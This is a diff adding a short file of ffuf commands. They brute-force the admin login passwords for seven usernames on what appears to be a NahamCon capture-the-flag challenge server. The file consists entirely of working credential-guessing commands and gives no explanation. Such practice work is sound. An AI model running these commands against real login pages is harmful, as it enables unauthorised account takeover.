@@ -1,0 +1,7 @@
+ffuf -w passwords.txt -u http://challenge.nahamcon.com:31473/admin/login -X POST -d "username=Original&password=FUZZ" -fr "Invalid username or password"
+ffuf -w passwords.txt -u http://challenge.nahamcon.com:31473/admin/login -X POST -d "username=Cool&password=FUZZ" -fr "Invalid username or password"
+ffuf -w passwords.txt -u http://challenge.nahamcon.com:31473/admin/login -X POST -d "username=Punk&password=FUZZ" -fr "Invalid username or password"
+ffuf -w passwords.txt -u http://challenge.nahamcon.com:31473/admin/login -X POST -d "username=Roller&password=FUZZ" -fr "Invalid username or password"
+ffuf -w passwords.txt -u http://challenge.nahamcon.com:31473/admin/login -X POST -d "username=Sporty&password=FUZZ" -fr "Invalid username or password"
+ffuf -w passwords.txt -u http://challenge.nahamcon.com:31473/admin/login -X POST -d "username=Tie-Dye&password=FUZZ" -fr "Invalid username or password"
+ffuf -w passwords.txt -u http://challenge.nahamcon.com:31473/admin/login -X POST -d "username=Zebra&password=FUZZ" -fr "Invalid username or password"
